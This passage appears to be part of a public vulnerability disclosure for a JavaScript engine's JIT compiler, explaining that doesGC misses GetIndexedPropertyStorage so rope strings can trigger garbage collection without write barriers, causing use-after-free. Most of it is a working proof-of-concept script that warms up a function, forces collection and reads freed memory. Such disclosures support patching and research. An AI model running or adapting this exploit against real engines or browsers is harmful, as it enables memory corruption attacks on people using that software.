The doesGC function simply takes a node, and tells if it might cause a garbage collection. This function is used to determine whether to insert write barriers. But it&#039;s missing GetIndexedPropertyStorage that can cause a garbage collection via rope strings. As a result, it can lead to UaF.

PoC:
*/

function gc() {
    for (let i = 0; i < 10; i++) {
        new ArrayBuffer(1024 * 1024 * 10);
    }
}

function opt(arr) {
    let r = /a/;
    let o = {};

    arr[0].charAt(0);
    arr[1].charAt(0);
    arr[2].charAt(0);
    arr[3].charAt(0);
    arr[4].charAt(0);
    arr[5].charAt(0);
    arr[6].charAt(0);
    arr[7].charAt(0);
    arr[8].charAt(0);
    arr[8].charAt(0);
    arr[9].charAt(0);

    o.x = &#039;a&#039;.match(r);

    return o;
}

function main() {
    for (let i = 0; i < 10000; i++) {
        opt([&#039;a&#039; + i, &#039;b&#039; + i, &#039;c&#039; + i, &#039;d&#039; + i, &#039;e&#039; + i, &#039;f&#039; + i, &#039;g&#039; + i, &#039;h&#039; + i, &#039;i&#039; + i, &#039;j&#039; + i]);
    }

    let a = &#039;a&#039;.repeat(1024 * 1024 * 2);
    let b = &#039;a&#039;.repeat(1024 * 1024 * 2);

    let arr = [];
    for (let i = 0; i < 10; i++) {
        arr[i] = a + b;
    }

    gc();

    let o = opt(arr);

    gc();

    let tmp = [1234];

    print(o.x);  // 1234
}

main();

